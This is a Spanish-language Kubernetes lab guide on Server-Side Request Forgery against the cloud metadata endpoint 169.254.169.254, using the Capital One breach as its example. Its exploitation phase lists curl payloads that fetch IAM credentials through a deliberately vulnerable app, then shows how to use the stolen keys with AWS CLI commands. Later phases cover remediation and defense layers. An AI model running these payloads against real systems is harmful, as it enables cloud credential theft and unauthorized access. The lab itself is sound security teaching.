# Lab 1: SSRF & Acceso a Cloud Metadata

## Objetivo

Demostrar cómo una vulnerabilidad SSRF (Server-Side Request Forgery) en una aplicación web permite a un atacante acceder al Instance Metadata Service (IMDS) en `169.254.169.254` y robar credenciales IAM del nodo cloud.

## 🔴 Caso Real: Capital One (2019)

En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un WAF mal configurado de Capital One para acceder al IMDS de AWS. Robó credenciales IAM temporales que le permitieron acceder a más de **100 millones de registros** de clientes almacenados en S3. La multa fue de **$80 millones de dólares**. El vector exacto: SSRF → `169.254.169.254` → IAM credentials → S3 buckets.

---

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `vulnerable.yaml` | App Flask con SSRF, sin NetworkPolicy (puede alcanzar IMDS) |
| `secure.yaml` | App con validación de URLs + NetworkPolicy bloqueando IMDS |

---

## Fase 1: Desplegar Escenario Vulnerable

```bash
kubectl apply -f vulnerable.yaml
kubectl get pods -n lab2-ssrf -w
# Esperar a que esté Running (puede tardar ~30s por pip install)
```

## Fase 2: Explotación SSRF

### Paso 1: Acceder a la app

```bash
# Si usas minikube:
minikube service ssrf-app-svc -n lab2-ssrf --url

# O directamente:
# http://<NODE-IP>:31082
```

### Paso 2: Probar SSRF al IMDS (AWS)

```bash
# Desde el navegador o curl:

# Listar metadata disponible
curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/"

# Obtener el IAM role del nodo
curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Robar credenciales temporales
curl "http://<NODE-IP>:31082/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>"
# → AccessKeyId, SecretAccessKey, Token
```

### Paso 3: Usar credenciales robadas (si estás en AWS real)

```bash
export AWS_ACCESS_KEY_ID="<robado>"
export AWS_SECRET_ACCESS_KEY="<robado>"
export AWS_SESSION_TOKEN="<robado>"

# Listar buckets S3
aws s3 ls

# Describir instancias EC2
aws ec2 describe-instances

# → CONTROL sobre recursos cloud del nodo
```

> **Nota**: En minikube/local, `169.254.169.254` no responde. El lab demuestra el flujo de SSRF. En un EKS/GKE/AKS real, sí retorna credenciales.

## Fase 3: Aplicar Remediación

```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f secure.yaml
```

## Fase 4: Verificar que SSRF es Bloqueado

```bash
# Intentar SSRF al IMDS
curl "http://<NODE-IP>:31083/fetch?url=http://169.254.169.254/latest/meta-data/"
# → {"blocked": true, "error": "Acceso a 169.254.169.254 bloqueado (red privada/IMDS)"}

# Intentar IPs internas
curl "http://<NODE-IP>:31083/fetch?url=http://10.96.0.1/"
# → {"blocked": true, "error": "Acceso a 10.96.0.1 bloqueado (red privada/IMDS)"}

# URL legítima sí funciona
curl "http://<NODE-IP>:31083/fetch?url=https://httpbin.org/ip"
# → {"data": ...}  (funciona)
```

---

## Capas de Defensa

| Capa | Defensa | Cómo Funciona |
|------|---------|---------------|
| **Red** | NetworkPolicy egress | Bloquea tráfico a `169.254.169.254/32` desde Pods |
| **App** | Validación de URLs | Resuelve DNS, verifica IP contra rangos bloqueados |
| **Cloud** | IMDSv2 (AWS) | Requiere token PUT previo — SSRF simple no funciona |
| **Identity** | Workload Identity | Elimina la necesidad de IMDS por completo |
| **WAF** | Reglas anti-SSRF | Detecta patrones de SSRF en URLs de input |

---

## Cleanup

```bash
kubectl delete namespace lab2-ssrf
```
